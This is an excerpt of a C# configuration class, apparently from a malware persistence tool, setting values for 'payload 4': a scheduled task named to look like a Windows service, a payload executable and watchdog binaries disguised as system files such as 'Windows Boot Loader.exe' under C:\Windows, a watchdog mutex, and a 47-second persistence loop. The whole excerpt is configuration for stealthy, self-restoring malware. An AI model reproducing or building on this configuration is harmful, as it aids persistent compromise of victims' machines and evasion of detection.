public class Config // This is for payload 4
{
    ...
    public static int sleepTime { get; private set; } = 47000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
    ...
    public static string ScheduledTaskName { get; private set; } = "Windows Task Servicer";


    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "WinDiskService.exe";
    ...
    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Security\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "Windows Boot Loader.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin4";
